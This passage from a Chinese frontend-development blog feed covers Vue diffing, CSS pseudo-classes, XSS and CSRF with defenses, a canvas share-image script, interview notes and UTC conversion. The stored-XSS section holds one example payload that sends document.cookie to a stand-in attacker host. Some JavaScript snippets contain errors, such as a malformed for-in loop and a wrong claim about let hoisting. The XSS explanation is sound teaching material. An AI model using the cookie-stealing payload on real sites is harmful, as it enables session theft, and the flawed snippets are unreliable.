<p>Vue2的核心diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，在进行相关操作。</p>
<p>Vue3借鉴了<a href="https://github.com/localvoid/ivi" target="_blank" rel="noopener">ivi</a>算法和<a href="https://github.com/infernojs/inferno" target="_blank" rel="noopener">inferno</a>算法<br>在创建VNode时就确定其类型，以及在patch的过程中采用位运算来判断其类型。<br>更加详细的介绍可以参考<a href="https://juejin.im/post/5d36cc575188257aea108a74" target="_blank" rel="noopener">深入剖析：Vue核心之虚拟DOM</a></p>
</blockquote>
<h3 id="伪类和伪元素"><a href="#伪类和伪元素" class="headerlink" title="伪类和伪元素"></a>伪类和伪元素</h3><blockquote>
<p>大家应该都听过这两个名词，但是这两个却很容易混淆，我们要牢记这些概念需要从它们的产生开始了解。</p>
<p>css引入伪类和伪元素概念是为了格式化文档树以外的信息。也就是说，伪类和伪元素是用来修饰不在文档树中的部分，比如，一句话中的第一个字母，或者是列表中的第一个元素。下面分别对伪类和伪元素进行解释。</p>
<p>伪类用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态是根据用户行为而动态变化的。比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。虽然它和普通的css类相似，可以为已有的元素添加样式，但是它只有处于dom树无法描述的状态下才能为元素添加样式，所以将其称为伪类。</p>
<p>伪元素用于创建一些不在文档树中的元素，并为其添加样式。比如说，我们可以通过:before来在一个元素前增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在文档树中。</p>
</blockquote>
<ul>
<li>具体标签<br><img src="/images/class1.png" alt="Image"><br><img src="/images/class2.png" alt="Image"></li>
</ul>
<h3 id="前端安全相关"><a href="#前端安全相关" class="headerlink" title="前端安全相关"></a>前端安全相关</h3><blockquote>
<p>大家应该都知道一些这方面的知识，比如XSS、CSRF等，但是当别人问的更加详细时（如何实现相应的攻击等），就有可能回答不上来了。</p>
</blockquote>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><blockquote>
<p>XSS(Cross Site Script)跨站脚本攻击。指的是攻击者向网页注入恶意的客户端代码，通过恶意的脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。主要分为3种：</p>
</blockquote>
<h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><blockquote>
<p>反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。</p>
<p>反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。</p>
<p>比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 “反射”到受害者的浏览器上，从而浏览器就执行了该脚本。</p>
</blockquote>
<ul>
<li>攻击步骤</li>
</ul>
<ol>
<li>攻击者在url后面的参数中加入恶意攻击代码。</li>
<li>当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。</li>
<li>用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。</li>
<li>攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。</li>
</ol>
<h5 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h5><blockquote>
<p>存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p>
<p>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：<script>window.open(“www.gongji.com?param=”+document.cookie)</script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。</p>
</blockquote>
<ul>
<li>攻击步骤</li>
</ul>
<ol>
<li>攻击者将恶意代码提交到目标网站数据库中。</li>
<li>用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。</li>
<li>用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。</li>
<li>那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。</li>
</ol>
<h5 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h5><blockquote>
<p>我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。</p>
</blockquote>
<ul>
<li>攻击步骤</li>
</ul>
<ol>
<li>使用document.write直接输出数据。</li>
<li>使用innerHTML直接输出数据。</li>
<li>使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。</li>
</ol>
<h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ol>
<li>对输入内容的特定字符进行编码，例如表示 html标记的 &lt; &gt; 等符号。 </li>
<li>对重要的 cookie设置 httpOnly, 防止客户端通过document.cookie读取 cookie，此 HTTP头由服务端设置。 </li>
<li>将不可信的值输出 URL参数之前，进行 URLEncode操作，而对于从 URL参数中获取值一定要进行格式检测（比如你需要的时URL，就判读是否满足URL格式）。 </li>
<li>不要使用 Eval来解析并运行不确定的数据或代码，对于 JSON解析请使用 JSON.parse() 方法。 5. 后端接口也应该要做到关键字符过滤的问题。 以上，是小墨给大家分享的关于XSS攻击的全部内容，大家记得收藏方便以后查看哦。如今，各种类型网络攻击日益频繁，除了XSS攻击之外，比较常见的网络攻击类型还包括DDoS攻击、CC攻击等，它们非常难以防御，除了需要做好日常网络安全防护之外，还需要接入高防服务，可以接入墨者盾高防，通过墨者盾高防隐藏源IP，对攻击流量进行清洗，保障企业网络及业务的正常运行。</li>
</ol>
<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><blockquote>
<p>CSRF攻击(Cross-site request forgery)跨站请求伪造。是一种劫持受信任用户向服务器发送非预期请求的攻击方式，通常情况下，它是攻击者借助受害者的 Cookie 骗取服务器的信任，但是它并不能拿到Cookie，也看不到Cookie的内容，它能做的就是给服务器发送请求，然后执行请求中所描述的命令，以此来改变服务器中的数据，也就是并不能窃取服务器中的数据。</p>
</blockquote>
<ul>
<li>攻击步骤</li>
</ul>
<ol>
<li>登录受信任网站A，并在本地生成Cookie。</li>
<li>在不登出A的情况下，访问危险网站B。</li>
</ol>
<ul>
<li>防御</li>
</ul>
<ol>
<li>验证Token：浏览器请求服务器时，服务器返回一个token，每个请求都需要同时带上token和cookie才会被认为是合法请求</li>
<li>验证Referer：通过验证请求头的Referer来验证来源站点，但请求头很容易伪造</li>
<li>设置SameSite：设置cookie的SameSite，可以让cookie不随跨站请求发出，但浏览器兼容不一</li>
</ol>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>一次canvas的使用</title>
    <url>/2018/08/29/%E4%B8%80%E6%AC%A1canvas%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;对于canvas虽然知道它十分的强大并且自己看过，但是在实际的工作中自己还没遇到过需要使用的情况。但是在最近的一个测马拉松成绩的活动中，需要将成绩页面生成图片分享出去。不使用其他的插件的情况下，我首先想到的就是使用canvas来画。最后自己也实现了这个功能，同时发现原来canvas这么好用。下面就是关于canvas的代码以及最后的效果。<br><a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> _self=<span class="keyword">this</span>;</span><br><span class="line"><span class="comment">//this.setMum(true);</span></span><br><span class="line"><span class="keyword">let</span> feedData=&#123;</span><br><span class="line"><span class="string">"name"</span>: <span class="keyword">this</span>.info.user_name,</span><br><span class="line"><span class="string">"mes"</span>:<span class="string">'“'</span>+<span class="keyword">this</span>.wenan+<span class="string">'”'</span>,</span><br><span class="line"><span class="string">"time"</span>:<span class="keyword">this</span>.info.chengji,</span><br><span class="line"><span class="string">"img"</span>:<span class="keyword">this</span>.info.user_portrait,<span class="comment">//this.info.user_portrait</span></span><br><span class="line"><span class="string">"process"</span>:<span class="keyword">this</span>.info.process,</span><br><span class="line"><span class="string">"bg"</span>:<span class="string">"http://activity-codoon.b0.upaiyun.com/fxd/1533867941041/mls.jpg"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//alert(feedData.img)</span></span><br><span class="line"><span class="keyword">var</span> mycanvas=<span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line"><span class="comment">//document.body.appendChild(mycanvas);</span></span><br><span class="line">mycanvas.width=<span class="number">750</span>;</span><br><span class="line">mycanvas.height=<span class="number">1300</span>;</span><br><span class="line"><span class="keyword">var</span> context=mycanvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line"><span class="comment">//画背景</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">drawing</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">img.crossOrigin = <span class="string">"Anonymous"</span>;</span><br><span class="line"><span class="comment">// alert('start');</span></span><br><span class="line">img.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">// alert('画背景');</span></span><br><span class="line">context.drawImage(img,<span class="number">0</span>,<span class="number">0</span>,mycanvas.width,mycanvas.height);</span><br><span class="line"><span class="keyword">var</span> tou = <span class="keyword">new</span> Image();</span><br><span class="line">tou.crossOrigin = <span class="string">"Anonymous"</span>;</span><br><span class="line">tou.src=feedData.img;</span><br><span class="line">tou.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//alert('画头像')</span></span><br><span class="line">context.save(); <span class="comment">// 保存当前_context的状态</span></span><br><span class="line">　　　　 context.beginPath();</span><br><span class="line">　　　　 <span class="comment">//context.moveTo(mycanvas.width/2,370);</span></span><br><span class="line">　　　　 <span class="comment">//context.lineWidth="20";</span></span><br><span class="line">　　　　<span class="comment">//画出圆</span></span><br><span class="line">　　　　 context.arc(mycanvas.width/<span class="number">2</span>,<span class="number">155</span>,<span class="number">82</span>,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,<span class="literal">true</span>);</span><br><span class="line">　　　　<span class="comment">//圆有个边框</span></span><br><span class="line">　　　　 context.lineWidth=<span class="number">20</span>;</span><br><span class="line">　　　　 context.strokeStyle = <span class="string">'#499e87'</span>;</span><br><span class="line">　　　　 context.fill();</span><br><span class="line">　　　　 context.stroke();</span><br><span class="line">　　　　<span class="comment">//裁剪上面的圆形</span></span><br><span class="line">　　　　 context.clip();</span><br><span class="line">　　　　<span class="comment">// 在刚刚裁剪的园上画图</span></span><br><span class="line">context.drawImage(tou,mycanvas.width/<span class="number">2</span><span class="number">-82</span>,<span class="number">155</span><span class="number">-82</span>,<span class="number">164</span>,<span class="number">164</span>);</span><br><span class="line">　　　　 context.restore();</span><br><span class="line">　　　　 context.stroke();</span><br><span class="line">drawText();</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line">img.onerror=<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">alert(<span class="string">'图片加载过时'</span>);</span><br><span class="line">&#125;</span><br><span class="line">img.src=feedData.bg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//画文本</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">drawText</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//头像</span></span><br><span class="line"><span class="comment">// context.drawImage(feedData.img,0,0);</span></span><br><span class="line"></span><br><span class="line">context.font=<span class="string">'28px 微软雅黑'</span>;</span><br><span class="line">context.fillStyle=<span class="string">'#fbf8f4'</span>;</span><br><span class="line">context.textAlign = <span class="string">'center'</span>;</span><br><span class="line"><span class="comment">//收信人 mycanvas.width/2-70</span></span><br><span class="line">context.fillText(feedData.name,mycanvas.width/<span class="number">2</span>,<span class="number">290</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//信息内容</span></span><br><span class="line">context.font=<span class="string">'65px 微软雅黑 blod'</span>;</span><br><span class="line">context.fillStyle=<span class="string">'#ffffff'</span>;</span><br><span class="line">context.textAlign = <span class="string">'right'</span>;</span><br><span class="line"><span class="comment">//canvasTextAutoLine(feedData.mes,mycanvas,90,500,62);</span></span><br><span class="line">context.fillText(feedData.time,mycanvas.width<span class="number">-170</span>,<span class="number">490</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//跑力值</span></span><br><span class="line">context.font=<span class="string">'35px 微软雅黑 blod'</span>;</span><br><span class="line">context.fillStyle=<span class="string">'#ffffff'</span>;</span><br><span class="line">context.textAlign = <span class="string">'right'</span>;</span><br><span class="line"><span class="comment">//canvasTextAutoLine(feedData.mes,mycanvas,90,500,62);</span></span><br><span class="line">context.fillText(feedData.process,mycanvas.width<span class="number">-80</span>,<span class="number">590</span>);</span><br><span class="line"><span class="comment">//成绩信息</span></span><br><span class="line">context.font=<span class="string">'50px 微软雅黑'</span>;</span><br><span class="line">context.fillStyle=<span class="string">'#fbd15b'</span>;</span><br><span class="line">context.textAlign = <span class="string">'center'</span>;</span><br><span class="line">context.fillText(feedData.mes,mycanvas.width/<span class="number">2</span>,<span class="number">360</span>);</span><br><span class="line"><span class="comment">//进度条</span></span><br><span class="line">context.fillStyle=<span class="string">"#ffffff"</span>;</span><br><span class="line">context.lineJoin = <span class="string">"round"</span>;</span><br><span class="line">context.lineWidth = <span class="number">30</span>;</span><br><span class="line">context.fillRect(mycanvas.width/<span class="number">2</span><span class="number">-150</span>, <span class="number">570</span>, <span class="number">350</span>, <span class="number">20</span>);</span><br><span class="line"><span class="comment">//进度条2</span></span><br><span class="line">context.fillStyle=<span class="string">"#fbd15b"</span>;</span><br><span class="line">context.lineJoin = <span class="string">"round"</span>;</span><br><span class="line">context.lineWidth = <span class="number">30</span>;</span><br><span class="line">context.fillRect(mycanvas.width/<span class="number">2</span><span class="number">-150</span>, <span class="number">570</span>, feedData.process*<span class="number">3.5</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> finalimg=mycanvas.toDataURL(<span class="string">"image/png"</span>);</span><br><span class="line"><span class="comment">// _self.setMum(false);</span></span><br><span class="line"><span class="built_in">console</span>.log(finalimg)</span><br><span class="line"><span class="comment">//document.getElementById('testimg').src=finalimg;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//上传图片</span></span><br><span class="line"><span class="comment">/*_self.$store.dispatch('goLot',&#123;'url':finalimg&#125;).then(()=&gt;&#123;</span></span><br><span class="line"><span class="comment">_self.closeLottc();</span></span><br><span class="line"><span class="comment">_self.$router.push('ucenter');</span></span><br><span class="line"><span class="comment">&#125;)*/</span></span><br><span class="line"><span class="comment">//alert('before axios')</span></span><br><span class="line">axios.post(<span class="string">'https://www.codoon.com/activity/v1/api/upload/dataurl'</span>,&#123;</span><br><span class="line">data: finalimg,</span><br><span class="line">type: <span class="string">'image/png'</span></span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(response.status)&#123;</span><br><span class="line"><span class="comment">//that.$store.commit('UPDATEUSERINFO', response.data);</span></span><br><span class="line">goShareImg(response.data);</span><br><span class="line"><span class="built_in">console</span>.log(response);</span><br><span class="line"><span class="comment">//alert('response')</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">alert(response.description)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(response)</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">alert(error);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//换行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canvasTextAutoLine</span>(<span class="params">str,canvas,initX,initY,lineHeight</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> ctx = canvas.getContext(<span class="string">"2d"</span>);</span><br><span class="line"><span class="keyword">var</span> lineWidth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> canvasWidth = canvas.width<span class="number">-90</span>;</span><br><span class="line"><span class="keyword">var</span> lastSubStrIndex= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;str.length;i++)&#123;</span><br><span class="line">lineWidth+=ctx.measureText(str[i]).width;</span><br><span class="line"><span class="keyword">if</span>(lineWidth&gt;canvasWidth-initX)&#123;<span class="comment">//减去initX,防止边界出现的问题</span></span><br><span class="line">ctx.fillText(str.substring(lastSubStrIndex,i),initX,initY);</span><br><span class="line">initY+=lineHeight;</span><br><span class="line">lineWidth=<span class="number">0</span>;</span><br><span class="line">lastSubStrIndex=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==str.length<span class="number">-1</span>)&#123;</span><br><span class="line">ctx.fillText(str.substring(lastSubStrIndex,i+<span class="number">1</span>),initX,initY);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">drawing();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">alert(<span class="string">'catcherror:'</span>+error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>其中有个坑就是画上去的图片需要加上可以跨域的代码<br> <img src="/images/m1.jpg" alt="My Pic"><br>  <img src="/images/m2.jpg" alt="My Pic"></p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>一次面试分享</title>
    <url>/2018/09/27/%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;这周去面了美团面试，过了一面。但是二面等了太久太久了，自己还有事就没参加。总的来说一面的知识点还是比较基础的，都是一些面试中经常会问到的，比如闭包，作用域，跨域，session，cookie，盒模型等等。下面就简单的说一下这次面试的一些总结和心得体会吧。<br><a id="more"></a></p>
<h1 id="1盒模型"><a href="#1盒模型" class="headerlink" title="1盒模型"></a>1盒模型</h1><p>首先我们都知道盒模型分为标准盒模型以及ie盒模型，要了解他们的不同首先就要知道盒模型由哪些构成，以及各个部分所在的位置。<br>构成：（由️内到外）content-&gt;padding-&gt;border-&gt;margin<br>接下来说一下他们的区别：标准的盒模型的width=content    而ie盒模型的width=content+padding+border<br>如何设置呢：通过css中的box-sizing属性来设置，标准是content-box  ie是border-box   默认是content-box<br><img src="/images/box.png" alt="My Pic"></p>
<h1 id="2跨域的方法以及原理"><a href="#2跨域的方法以及原理" class="headerlink" title="2跨域的方法以及原理"></a>2跨域的方法以及原理</h1><p>首先就要说到同源策略，指的是端口、协议、域名都要相同，不然就会报同源策略的错。 </p>
<h2 id="2-1jsonp"><a href="#2-1jsonp" class="headerlink" title="2.1jsonp"></a>2.1jsonp</h2><p>原理:通过script标签引入的js是不受同源策略的限制的 通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。所以jsonp是需要服务器端的页面进行相应的配合的。它只支持GET请求而不支持POST等其它类型的HTTP请求</p>
<h2 id="2-2document-domain"><a href="#2-2document-domain" class="headerlink" title="2.2document.domain"></a>2.2document.domain</h2><p>通过修改document的domain属性，我们可以在域和子域或者不同的子域之间通信。同域策略认为域和子域隶属于不同的域，比如baidu.com和 youxi.baidu.com是不同的域，这时，我们无法在baidu.com下的页面中调用youxi.baidu.com中定义的JavaScript方法。但是当我们把它们document的domain属性都修改为baidu.com，浏览器就会认为它们处于同一个域下，那么我们就可以互相获取对方数据或者操作对方DOM了。</p>
<h2 id="2-3修改header"><a href="#2-3修改header" class="headerlink" title="2.3修改header"></a>2.3修改header</h2><p>header(“Access-Control-Allow-Origin: xx”)这个就是一个支持跨域的请求。</p>
<h2 id="2-4window-name"><a href="#2-4window-name" class="headerlink" title="2.4window.name"></a>2.4window.name</h2><p>window 对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面 A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后（iframe.onload），页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出iframe的window.name的值了（因为A中的window.name和iframe中的window.name互相独立的，所以不能直接在A中获取window.name，而要通过iframe获取其window.name）。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。</p>
<h1 id="3遍历一个对象"><a href="#3遍历一个对象" class="headerlink" title="3遍历一个对象"></a>3遍历一个对象</h1><p>很多的问题都会基于这一个步骤，比如深拷贝、比较两个对象是否相等<br>常用的方法有两个<br>1.for in<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">	name:<span class="string">'1'</span>,</span><br><span class="line">	age:<span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> obj&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(key)<span class="comment">//name age</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.Object.keys<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">	name:<span class="string">'1'</span>,</span><br><span class="line">	age:<span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.keys(obj)<span class="comment">//返回一个数组['name','age']</span></span><br></pre></td></tr></table></figure></p>
<h1 id="4cdn是什么"><a href="#4cdn是什么" class="headerlink" title="4cdn是什么"></a>4cdn是什么</h1><p>dn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。<br>如何实现快速 其实就是在离自己最近的服务器上获取到资源<br> 1.dns请求当地local DNS    2.当地local DNS递归的查询服务器的gslb    3.服务器根据local DNS 分配最佳节点，返回ip    4.用户获得最佳接入ip，访问最佳节点。    5.如果该节点没有用户想要获取的内容，则通过内部路由访问上一节点，直到找到文件或到达源站为止。    6.cdn节点缓存该数据，下次请求该文件时可以直接返回。</p>
<h1 id="5cookie-session"><a href="#5cookie-session" class="headerlink" title="5cookie session"></a>5cookie session</h1><p>它们都可以来记录一些状态的 ，因为http是无状态的协议<br>cookie<br>通俗讲，是访问某些网站后在本地存储的一些网站相关信息，下次访问时减少一些步骤。更准确的说法是：Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一服务器，是在客户端保持状态的方案。<br>Cookie的主要内容包括：名字，值，过期时间，路径和域。<br>session<br>存在服务器的一种用来存放用户数据的结构浏览器第一次发送请求时，服务器自动生成了一HashTable和一Session ID来唯一标识这个HashTable，并将其通过响应发送到浏览器。浏览器第二次发送请求会将前一次服务器响应中的Session ID放在请求中一并发送到服务器上，服务器从请求中提取出Session ID，并和保存的所有Session ID进行对比，找到这个用户对应的HashTable。<br>一般这个值会有个时间限制，超时后毁掉这个值，默认30分钟。<br>当用户在应用程序的 Web页间跳转时，存储在 Session 对象中的变量不会丢失而是在整个用户会话中一直存在下去。<br>Session的实现方式和Cookie有一定关系。建立一个连接就生成一个session id，打开几个页面就好几个了，这里就用到了Cookie，把session id存在Cookie中，每次访问的时候将Session id带过去就可以识别了.</p>
<h1 id="6作用域-变量提升"><a href="#6作用域-变量提升" class="headerlink" title="6作用域 变量提升"></a>6作用域 变量提升</h1><p>这里就直接上一道经典的题<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'xixi'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(a)</span><br><span class="line">		<span class="keyword">var</span> a = <span class="string">'haha'</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">x()<span class="comment">//undefined</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'xixi'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(a)</span><br><span class="line">	    a = <span class="string">'haha'</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">x()<span class="comment">//xixi</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'xixi'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(a)</span><br><span class="line">		<span class="keyword">let</span> a = <span class="string">'haha'</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">x()<span class="comment">//xixi</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'xixi'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!a)&#123;</span><br><span class="line">		<span class="keyword">var</span> a = <span class="string">'haha'</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line">x()<span class="comment">//haha</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Javascript</category>
        <category>面试</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>前端</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>一种时间的表示</title>
    <url>/2018/07/09/%E4%B8%80%E7%A7%8D%E6%97%B6%E9%97%B4%E7%9A%84%E8%A1%A8%E7%A4%BA/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近在最一个项目，今天在项目中突然发现了一个很神奇的地方。一个页面里从后台接收一个时间的参数，数据是nowtime:”2018-08-01t18:05:02.000Z”,我通过new Date()传入这个时间参数，当输出的时候时间竟然是2号了。当时以为是自己记错了new Date()的用法，于是自己查了一下，发现没错。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;于是百度了这个时间，这才发现问题，这个时间是UTC标准时以z来标识，可以表示全球时间，中国大陆、中国香港、中国澳门、中国台湾、蒙古国、新加坡、马来西亚、菲律宾、西澳大利亚州的时间与UTC的时差均为+8，也就是UTC+8。所以就变为了2号了。<br>那怎么转换呢？<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//本地时间到UTC时间的转换</span></span><br><span class="line"><span class="comment">//获取年：</span></span><br><span class="line"><span class="keyword">var</span> y =  date.getUTCFullYear();    </span><br><span class="line"><span class="comment">//获取月：</span></span><br><span class="line"><span class="keyword">var</span> m = date.getUTCMonth() ;</span><br><span class="line"><span class="comment">//获取日： </span></span><br><span class="line"><span class="keyword">var</span> d = date.getUTCDate();</span><br><span class="line"><span class="comment">//获取小时：</span></span><br><span class="line"><span class="keyword">var</span> h= date.getUTCHours();</span><br><span class="line"><span class="comment">//获取分钟：</span></span><br><span class="line"><span class="keyword">var</span> M = date.getUTCMinutes();</span><br><span class="line"><span class="comment">//获取秒钟：</span></span><br><span class="line"><span class="keyword">var</span> s = date.getUTCSeconds();</span><br><span class="line"><span class="comment">//使用UTC函数转换</span></span><br><span class="line"><span class="keyword">var</span> utc = <span class="built_in">Date</span>.UTC(y,m,d,h,M,s);</span><br><span class="line"></span><br><span class="line"><span class="comment">//UTC到本地时间</span></span><br><span class="line"><span class="keyword">var</span> date2 = <span class="keyword">new</span> <span class="built_in">Date</span>(utc);</span><br><span class="line"><span class="keyword">var</span> localeString = date2.toLocaleString();</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>交叉观察者的初步使用</title>
    <url>/2019/10/03/%E4%BA%A4%E5%8F%89%E8%A7%82%E5%AF%9F%E8%80%85%E7%9A%84%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最近项目中有一个需求需要在表格中实现无限加载的功能，由于表格已经是使用的iview的组件，就不能在使用那些无限滚动的组件了。于是自己想到了之前看到过一篇讲交叉观察者的文章好像能实现这个功能于是自己就去查了，并且试了一下最终还是实现了项目所需要的功能。下面就简单介绍一下交叉观察者的一些基本使用：<br><a id="more"></a></p>
